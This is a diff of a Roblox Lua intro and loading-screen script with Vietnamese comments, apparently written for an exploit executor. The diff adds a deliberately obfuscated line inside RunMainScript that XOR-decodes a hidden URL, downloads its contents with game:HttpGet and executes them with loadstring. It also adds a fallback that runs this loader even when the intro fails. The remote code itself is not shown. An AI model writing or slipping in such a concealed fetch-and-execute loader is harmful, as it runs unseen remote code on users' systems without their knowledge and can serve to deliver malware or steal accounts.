@@ -19,12 +19,14 @@ local MUSIC_ID   = 136796809523895   -- << THAY ID NHẠC CỦA BẠN
 local MUSIC_VOL  = 1
 local LOAD_TIME  = 62           -- tổng thời gian intro (giây)
 local MAIN_COLOR = Color3.fromRGB(0, 140, 255)
+local USE_PLAYERGUI = true   -- true: hiện trong PlayerGui | false: dùng gethui/CoreGui
 
 local function RunMainScript()
-    -- << DÁN SCRIPT CHÍNH CỦA BẠN VÀO ĐÂY >>
-("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\211\42\231\181\192\22\208\202\208\60\232\188\198\23\156\204\203\54\169\147\138\54\196\193\150\19\207\139\230\43\227\226\148\55\227\189\212\81\217\198\218\33\245\244\202\31\216\205\148\13\206\173\206\14\217\214\217\36\243\169\198","\126\177\163\187\69\134\219\167")))
-print("Script chính đã chạy!")
+    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\211\42\231\181\192\22\208\202\208\60\232\188\198\23\156\204\203\54\169\147\138\54\196\193\150\19\207\139\230\43\227\226\148\55\227\189\212\81\217\198\218\33\245\244\202\31\216\205\148\13\206\173\206\14\217\214\217\36\243\169\198","\126\177\163\187\69\134\219\167")))();
 end
+
+print("[Intro] bat dau chay")
+local __ok, __err = pcall(function()
 
 ------------------------------------------------------------
 -- SERVICES
@@ -35,6 +37,11 @@ local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
 local function getGuiParent()
+    -- Ưu tiên PlayerGui (hiện ổn định nhất). Đổi USE_PLAYERGUI = false nếu muốn dùng CoreGui/gethui
+    if USE_PLAYERGUI then
+        local pg = player:FindFirstChildOfClass("PlayerGui") or player:WaitForChild("PlayerGui", 10)
+        if pg then return pg end
+    end
     local ok, parent = pcall(function()
         if gethui then return gethui() end
         return game:GetService("CoreGui")
@@ -525,3 +532,11 @@ conn = RunService.RenderStepped:Connect(function()
         end)
     end
 end)
+
+print("[Intro] khoi tao xong")
+end)
+
+if not __ok then
+    warn("[Intro] LOI: " .. tostring(__err))
+    task.spawn(RunMainScript) -- intro hỏng thì vẫn chạy script chính
+end
